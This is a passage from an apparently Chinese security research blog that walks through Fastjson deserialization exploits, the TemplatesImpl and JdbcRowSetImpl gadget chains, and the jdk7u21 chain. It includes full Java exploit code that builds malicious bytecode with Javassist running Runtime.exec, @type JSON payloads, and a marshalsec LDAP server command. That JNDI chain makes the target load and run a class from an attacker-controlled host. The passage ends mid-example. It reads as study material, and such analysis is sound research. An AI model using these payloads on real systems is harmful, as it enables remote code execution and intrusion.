Object obj1=JSON.parse(jsonstring);<br>        System.out.println(obj1.getClass().getName());<br>        System.out.println(obj1);<br><br>        System.out.println(<span class="hljs-string">&quot;parseObject:&quot;</span>);<br>        Object obj2=JSON.parseObject(jsonstring);<br>        System.out.println(obj2.getClass().getName());<br>        System.out.println(obj2);<br><br>        System.out.println(<span class="hljs-string">&quot;parseObject with class:&quot;</span>);<br>        Object obj3=JSON.parseObject(jsonstring,User.class);<br>        System.out.println(obj3.getClass().getName());<br>        System.out.println(obj3);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://www.hualigs.cn/image/608577baaece0.jpg"></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">type可以指定反序列化成服务器上的任意类<br><br>然后服务端会解析这个类，提取出这个类中符合要求的<span class="hljs-keyword">setter</span>方法与<span class="hljs-keyword">getter</span>方法（如setxxx）<br><br>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的<span class="hljs-keyword">setter</span>、<span class="hljs-keyword">getter</span>方法（即setxxx方法、getxxx方法）<br></code></pre></td></tr></table></figure><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>基于JDK 7u21 Gadgets，1.7版本通用，利用条件苛刻</p><p>利用条件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1.</span> 服务端使用parse<span class="hljs-constructor">Object()</span>时，必须使用如下格式才能触发漏洞：<br>    `<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">input</span>, Object.<span class="hljs-params">class</span>, Feature.SupportNonPublicField)</span>;`<br><span class="hljs-number">2.</span> 服务端使用parse<span class="hljs-literal">()</span>时，需要`<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse(text1,Feature.SupportNonPublicField);`<br></code></pre></td></tr></table></figure><p>jdk7u21反序列化的利用条件</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-number">1</span>.恶意类的父类必须为<span class="hljs-variable">ABSTRACT_TRANSLET</span> <br><span class="hljs-number">2</span>.TemplatesImpl类的<span class="hljs-variable">_bytecodes</span>不为<span class="hljs-variable"><span class="hljs-literal">null</span></span>，为恶意类字节码，<span class="hljs-variable">payload</span>写在恶意类的静态方法或构造方法<br><span class="hljs-number">3</span>.TemplatesImpl类的<span class="hljs-variable">_name</span>不为<span class="hljs-variable"><span class="hljs-literal">null</span></span><br><span class="hljs-number">4</span>.TemplatesImpl类的<span class="hljs-variable">_class</span>=<span class="hljs-variable"><span class="hljs-literal">null</span></span><br><span class="hljs-number">5</span>._tfactory需要是一个拥有<span class="hljs-function"><span class="hljs-title">getExternalExtensionsMap</span>()方法的类，即<span class="hljs-title">TransformerFactoryImpl</span>()，以此来兼容不同版本</span><br></code></pre></td></tr></table></figure><p>构造exp，FastJson反序列化过程中对<code>_bytecodes</code>、<code>_tfactory</code>等属性进行了操作，需要另外处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] getevilbyte() <span class="hljs-keyword">throws</span> Exception &#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br><br>        <span class="hljs-comment">//向静态方法中插入要执行的命令</span><br>        ctClass.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-comment">//设置满足条件的父类</span><br>        ctClass.setSuperclass((pool.get(AbstractTranslet.class.getName())));<br><br>        <span class="hljs-comment">//获取字节码</span><br>        <span class="hljs-keyword">byte</span>[] EvilByteCodes = ctClass.toBytecode();<br><br>        <span class="hljs-keyword">return</span> EvilByteCodes;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception </span>&#123;<br>        <span class="hljs-comment">//生成恶意类字节码</span><br>        <span class="hljs-keyword">byte</span>[] evilCode = getevilbyte();<br>        <span class="hljs-comment">//将字节码进行base64编码</span><br>        String evilCode_base64 = Base64.encodeBase64String(evilCode);<br>        String text1 = <span class="hljs-string">&quot;&#123;&quot;</span>+<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span>+<br>                <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="hljs-string">&quot;\&quot;],&quot;</span>+<br>                <span class="hljs-string">&quot;&#x27;_name&#x27;:&#x27;xx&#x27;,&quot;</span>+<br>                <span class="hljs-string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+<br>                <span class="hljs-string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+<br>                <span class="hljs-string">&quot;&#125;\n&quot;</span>;<br><br>        System.out.println(text1);<br>        <br>        <span class="hljs-comment">//处理private属性</span><br>        ParserConfig config = <span class="hljs-keyword">new</span> ParserConfig();<br>        <span class="hljs-comment">//反序列化</span><br>        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h3><p><code>_bytecodes</code>传输过程中会经过base64解码，所以在payload中需要进行base64编码</p><p>FieldDeserializer#parseField</p><p><code>parseField</code>中对<code>_bytecodes</code>中的内容进行了解析</p><p><img src="https://www.hualigs.cn/image/608577bdaf53a.jpg"></p><p><code>deserialize</code></p><p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p><p><code>parseArray</code></p><p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p><p><code>ObjectDeserializer#deserializer</code></p><p><img src="https://www.hualigs.cn/image/608577bd8fdbc.jpg"></p><p><code>byteValue</code></p><p>对<code>_bytecodes</code>进行base64解码</p><p><img src="https://www.hualigs.cn/image/608577bd93675.jpg"></p><p><img src="https://www.hualigs.cn/image/608577bda1ec4.jpg"></p><h3 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h3><p>FastJson会自动新建一个符合要求的对象实例，所以exp中<code>_factory</code>为<code>&#123;&#125;</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/com/</span>alibaba<span class="hljs-regexp">/fastjson/</span>parser<span class="hljs-regexp">/deserializer/</span>JavaBeanDeserializer.java<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577be6fc06.jpg"></p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>前面提到了FastJson反序列化会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。<code>com.sun.rowset.JdbcRowSetImp</code>l的<code>setAutoCommit()</code>方法中调用了l<code>ookup()</code>，且参数<code>DataSourceName</code>可控，由<code>setDataSourceName()</code>方法设置。由于这两个方法都符合规则，反序列化时自动调用这两个<code>setter</code>方法造成JNDI注入，进而触发命令执行。</p><p>JdbcRowSetImpl#setDataSourceName</p><p>调用父类的<code>setDataSourceName</code></p><p><img src="https://www.hualigs.cn/image/608577bce87af.jpg"></p><p>BaseRowSet#<code>setDataSourceName</code></p><p>父类的<code>setDataSourceName</code>，把<code>var1</code>赋值给<code>dataSoruce</code></p><p><img src="https://www.hualigs.cn/image/608577bcc6881.jpg"></p><p><code>setAutoCommit</code></p><p>这里调用了<code>connect()</code>方法，<code>var1</code>来源于POC中构造的属性<code>autoCommit</code>，实际测试中发现这个值可以是true也可以是false，只要保证有一个布尔类型的参数传入就不会影响正常执行。</p><p><img src="https://www.hualigs.cn/image/608577bd10f67.jpg"></p><p><code>connection</code></p><p>调用<code>lookup</code>，<code>this.getDataSourceName()</code>等于<code>var1</code>，接着请求我们的ldap服务器，触发命令执行</p><p><img src="https://www.hualigs.cn/image/608577bc56bb3.jpg"></p><p><img src="https://www.hualigs.cn/image/608577bc6121c.jpg"></p><p>接下来就是JNDI注入利用的思路了</p><p>使用marshalsec搭建ldap服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">127.0.0.1:8090</span>/#ExecTest<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577cc3bbd5.jpg"></p><p>ExecTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.Reader;<br><span class="hljs-keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExecTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException,InterruptedException</span>&#123;<br>        <br>        String cmd=<span class="hljs-string">&quot;calc&quot;</span>;<br>        <span class="hljs-keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);<br>        printMessage(process.getInputStream());;<br>        printMessage(process.getErrorStream());<br>        <span class="hljs-keyword">int</span> value=process.waitFor();<br>        System.out.println(value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printMessage</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream input)</span> </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">new</span> Thread (<span class="hljs-keyword">new</span> Runnable() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-comment">// TODO Auto-generated method stub</span><br>                Reader reader =<span class="hljs-keyword">new</span> InputStreamReader(input);<br>                BufferedReader bf = <span class="hljs-keyword">new</span> BufferedReader(reader);<br>                String line = <span class="hljs-keyword">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">while</span> ((line=bf.readLine())!=<span class="hljs-keyword">null</span>)<br>                    &#123;<br>                        System.out.println(line);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (IOException  e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>把编译后的恶意类<code>ExecTest.class</code>放到web目录下，然后开启web服务</p><p><img src="https://www.hualigs.cn/image/608577bb2d463.jpg"></p><p>利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception </span>&#123; <br>        String payload = <span class="hljs-string">&quot;&#123;\n&quot;</span> + <br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://192.168.111.129:1389/ExecTest\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parseObject(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608577beae4b9.jpg"></p><p>实际执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CLIENT</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="hljs-keyword">new</span> JdbcRowSetImpl();<br>        JdbcRowSetImpl_inc.setDataSourceName(<span class="hljs-string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);<br>        JdbcRowSetImpl_inc.setAutoCommit(<span class="hljs-keyword">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jdk7u21反序列化</title>
    <link href="/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由javassist负责构建一个恶意类并得到字节码，然后向<code>TemplatesImpl</code>的<code>_bytecodes</code>属性赋值恶意类的字节码，字节码数组在被<code>defineTransletClasses()</code>中被实例化成恶意类，调用构造函数中的命令触发RCE，需要调用<code>getOutputProperties()</code>触发</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl">恶意类的父类必须为<span class="hljs-variable">ABSTRACT_TRANSLET</span> <br><span class="hljs-variable">TemplatesImpl</span>类的<span class="hljs-variable">_bytecodes</span>不为<span class="hljs-variable"><span class="hljs-literal">null</span></span>，为恶意类字节码<br><span class="hljs-variable">TemplatesImpl</span>类的<span class="hljs-variable">_name</span>不为<span class="hljs-variable"><span class="hljs-literal">null</span></span><br><span class="hljs-variable">TemplatesImpl</span>类的<span class="hljs-variable">_class</span>=<span class="hljs-variable"><span class="hljs-literal">null</span></span><br><span class="hljs-variable">_tfactory</span>需要是一个拥有<span class="hljs-function"><span class="hljs-title">getExternalExtensionsMap</span>()方法的类，即<span class="hljs-title">TransformerFactoryImpl</span>()，以此来兼容不同版本</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860dfa8b360.jpg"></p><p><img src="https://www.hualigs.cn/image/60860dfa9b143.jpg"></p><p><code>defindTransletClasses()</code>执行完后，<code>_class[_transletIndex]</code>就已经是恶意类，接下来执行<code>newInstance()</code>实例化恶意类，从而执行构造方法中的payload</p><p><img src="https://www.hualigs.cn/image/60860dfb21109.jpg"></p><p><code>defineTransletClasses()</code>中恶意类的构造，把恶意类的字节码转换为类的实例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span><br><span class="hljs-function">       <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>&#123;<br>        <span class="hljs-comment">//_bytecodes不能为null</span><br>       <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) &#123;<br>           ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>       &#125;<br><br>       TransletClassLoader loader = (TransletClassLoader)<br>           AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;<br>               <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());<br>               &#125;<br>           &#125;);<br>       <span class="hljs-comment">//获取_bytecodes的长度，创建_class数组，这里需要让恶意类的字节码为一个二维字节数组</span><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> classCount = _bytecodes.length;<br>           _class = <span class="hljs-keyword">new</span> Class[classCount];<br><br>           <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>               _auxClasses = <span class="hljs-keyword">new</span> Hashtable();<br>           &#125;<br><br>           <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>               _class[i] = loader.defineClass(_bytecodes[i]);<br>               <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>               <span class="hljs-comment">// 恶意类的父类必须是ABSTRACT_TRANSLET</span><br>               <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                   _transletIndex = i;<br>               &#125;<br>               <span class="hljs-keyword">else</span> &#123;<br>                   _auxClasses.put(_class[i].getName(), _class[i]);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>               ErrorMsg err= <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>           ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>       &#125;<br>       <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>           ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myjdk7u21</span> </span>&#123;<br><br>    <span class="hljs-comment">//封装setFieldValue()方法，便于给类字段赋值</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field=obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span><br>        ClassPool pool =ClassPool.getDefault();<br>        <span class="hljs-comment">//创建恶意类Evil</span><br>        CtClass cc=pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br><br>        <span class="hljs-comment">//设置恶意类父类为AbstractTranslet</span><br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-comment">//创建恶意类的构造函数，写入payload</span><br>        CtConstructor cons=<span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]&#123;&#125;,cc);<br>        cons.setBody(<span class="hljs-string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);<br>        cc.addConstructor(cons);<br><br>        <span class="hljs-comment">//将Evil类转换成byte数组</span><br>        <span class="hljs-keyword">byte</span>[] TempByteCode=cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] ByteCode=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;TempByteCode&#125;;<br><br>        <span class="hljs-comment">//实例化TemplatesImpl类</span><br>        TemplatesImpl templates=TemplatesImpl.class.newInstance();<br>        <span class="hljs-comment">//为TemplatesImpl类的各个字段赋值</span><br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,ByteCode);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templates.getOutputProperties();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60860e00038f1.jpg"></p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>当没有没有触发<code>getOutputProperties()</code>的点，就需要使用动态代理，代理是为了在不改变目标对象方法的情况下对方法进行增强</p><p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p><p>例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 